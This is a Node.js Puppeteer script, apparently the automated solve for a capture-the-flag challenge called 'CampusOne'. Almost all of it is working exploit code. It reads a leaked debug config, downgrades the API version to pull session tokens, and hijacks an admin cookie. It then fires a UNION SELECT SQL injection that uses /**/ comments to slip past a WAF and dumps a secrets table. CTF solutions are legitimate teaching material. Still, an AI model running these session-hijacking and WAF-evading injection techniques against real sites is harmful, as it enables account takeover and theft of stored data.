/**
 * CampusOne CTF Challenge - Automated Solve Script
 * 
 * This script demonstrates the two-stage exploit:
 * 1. Session Hijacking via window.CAMPUS_CONFIG leak (CWE-200 / CWE-384)
 *    - OWASP A07:2021 - Identification and Authentication Failures
 * 2. SQL Injection in admin Order Search to extract the flag (CWE-89)
 *    - OWASP A03:2021 - Injection
 * 
 * Usage: node solve.js [URL]
 * Default URL: http://localhost:3000
 */

const puppeteer = require('puppeteer');

const BASE_URL = process.argv[2] || 'http://localhost:3000';

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function solve() {
    console.log('\n🚀 CampusOne CTF Solve Script');
    console.log('='.repeat(50));
    console.log(`Target: ${BASE_URL}\n`);

    const browser = await puppeteer.launch({
        headless: false, // Set to true for no UI
        slowMo: 100, // Slow down for demo visibility
        defaultViewport: { width: 1280, height: 800 }
    });

    try {
        const page = await browser.newPage();

        // ====== STAGE 1: Session Hijacking ======
        // Vulnerability: Sensitive Information Exposure (CWE-200) leading to Account Takeover.
        // The application leaks debug configuration in the client-side window object.
        console.log('📍 STAGE 1: Session Hijacking');
        console.log('-'.repeat(50));

        // Step 1.1: Visit homepage
        console.log('  [1.1] Visiting homepage...');
        await page.goto(BASE_URL, { waitUntil: 'networkidle2' });
        await page.screenshot({ path: 'solve_step1_homepage.png' });

        // Step 1.2: Extract debug endpoint from window.CAMPUS_CONFIG
        console.log('  [1.2] Extracting debug leak from window.CAMPUS_CONFIG...');
        const campusConfig = await page.evaluate(() => {
            // @ts-ignore
            return window.CAMPUS_CONFIG || null;
        });

        if (campusConfig && campusConfig.debug_endpoint) {
            console.log(`  ✅ Found debug_endpoint: ${campusConfig.debug_endpoint}`);
        } else {
            console.log('  ❌ Debug leak not found!');
            return;
        }

        // Step 1.3: Version Downgrade Attack
        // The config points to v2 (patched), we try v1 (vulnerable) which lacks proper session protection.
        // Weakness: API Versioning / improper deprecation of insecure endpoints.
        let debugEndpoint = campusConfig.debug_endpoint;
        if (debugEndpoint.includes('/v2/')) {
            console.log('  [1.3] Detected v2 endpoint. Attempting version downgrade to v1...');
            debugEndpoint = debugEndpoint.replace('/v2/', '/v1/');
            console.log(`        New target: ${debugEndpoint}`);
        } else {
            console.log('  [1.3] Using endpoint as-is...');
        }

        console.log(`        Fetching sessions...`);

        const sessionsResponse = await page.evaluate(async (endpoint) => {
            const res = await fetch(endpoint);
            return await res.json();
        }, debugEndpoint);

        console.log('  ✅ Active Sessions Found:');
        console.log(JSON.stringify(sessionsResponse, null, 4));

        // Step 1.4: Find admin session
        const adminSession = sessionsResponse.active_sessions?.find(
            s => s.role === 'administrator' || s.user === 'admin_root'
        );

        if (!adminSession) {
            console.log('  ❌ Admin session not found in leak!');
            return;
        }

        console.log(`  🎯 Admin Session Token: ${adminSession.sessionId}`);

        // Step 1.5: Set the admin cookie
        console.log('  [1.5] Setting admin session cookie...');
        await page.setCookie({
            name: 'session_id',
            value: adminSession.sessionId,
            domain: new URL(BASE_URL).hostname
        });

        // Step 1.6: Navigate to admin panel
        console.log('  [1.6] Navigating to /admin...');
        await page.goto(`${BASE_URL}/admin`, { waitUntil: 'networkidle2' });
        await page.screenshot({ path: 'solve_step2_admin_access.png' });

        const isAdmin = await page.evaluate(() => {
            return document.body.innerText.includes('Admin') &&
                document.body.innerText.includes('Overview');
        });

        if (isAdmin) {
            console.log('  ✅ STAGE 1 COMPLETE - Admin Panel Accessed!\n');
        } else {
            console.log('  ❌ Failed to access admin panel');
            return;
        }

        // ====== STAGE 2: SQL Injection ======
        // Vulnerability: SQL Injection (CWE-89) in search query.
        // We inject SQL commands to modify the query logic and dump the 'secrets' table.
        console.log('📍 STAGE 2: SQL Injection');
        console.log('-'.repeat(50));

        // Step 2.1: Navigate to Orders tab
        console.log('  [2.1] Clicking Orders tab...');
        await page.click('button:has-text("Orders")').catch(() => {
            // Fallback if :has-text doesn't work
            return page.evaluate(() => {
                const buttons = [...document.querySelectorAll('button')];
                const ordersBtn = buttons.find(b => b.textContent.includes('Orders'));
                if (ordersBtn) ordersBtn.click();
            });
        });
        await delay(500);
        await page.screenshot({ path: 'solve_step3_orders_tab.png' });

        // Step 2.2: Inject SQL payload (using /**/ to bypass WAF)
        // Technique: WAF Bypass using inline comments.
        // The WAF blocks spaces and keywords like 'UNION SELECT', but allows 'UNION/**/SELECT'.
        // This is possible because standard SQL parsers treat comments as whitespace.
        console.log('  [2.2] Injecting SQL payload (WAF Bypass)...');
        const sqlPayload = "'/**/UNION/**/SELECT/**/key,/**/value,/**/NULL,/**/NULL,/**/NULL/**/FROM/**/secrets--";

        await page.type('input[placeholder*="Search"]', sqlPayload);
        await page.screenshot({ path: 'solve_step4_sqli_payload.png' });

        // Step 2.3: Execute search
        console.log('  [2.3] Executing search...');
        await page.click('button:has-text("Search")').catch(() => {
            return page.evaluate(() => {
                const buttons = [...document.querySelectorAll('button')];
                const searchBtn = buttons.find(b => b.textContent.includes('Search'));
                if (searchBtn) searchBtn.click();
            });
        });
        await delay(1000);
        await page.screenshot({ path: 'solve_step5_sqli_results.png' });

        // Step 2.4: Extract flag from results
        console.log('  [2.4] Extracting flag from results...');
        const pageContent = await page.content();

        // Look for the flag pattern
        const flagMatch = pageContent.match(/RUSEC\{[^}]+\}/);

        if (flagMatch) {
            console.log('\n' + '='.repeat(50));
            console.log('🏆 FLAG CAPTURED!');
            console.log('='.repeat(50));
            console.log(`\n   ${flagMatch[0]}\n`);
            console.log('='.repeat(50));
        } else {
            console.log('  ⚠️ Flag not found in page content');
            console.log('  Checking API directly...\n');

            // Fallback: call API directly
            const searchResult = await page.evaluate(async (payload) => {
                const res = await fetch(`/api/admin/search?q=${encodeURIComponent(payload)}`);
                return await res.json();
            }, sqlPayload);

            console.log('  API Response:', JSON.stringify(searchResult, null, 2));

            const flagFromApi = JSON.stringify(searchResult).match(/RUSEC\{[^}]+\}/);
            if (flagFromApi) {
                console.log('\n' + '='.repeat(50));
                console.log('🏆 FLAG CAPTURED!');
                console.log('='.repeat(50));
                console.log(`\n   ${flagFromApi[0]}\n`);
                console.log('='.repeat(50));
            }
        }

        console.log('\n✅ Exploit complete! Screenshots saved to current directory.');
        console.log('   - solve_step1_homepage.png');
        console.log('   - solve_step2_admin_access.png');
        console.log('   - solve_step3_orders_tab.png');
        console.log('   - solve_step4_sqli_payload.png');
        console.log('   - solve_step5_sqli_results.png\n');

    } catch (error) {
        console.error('❌ Error:', error.message);
    } finally {
        // Keep browser open for 5 seconds to see results
        await new Promise(r => setTimeout(r, 5000));
        await browser.close();
    }
}

solve();
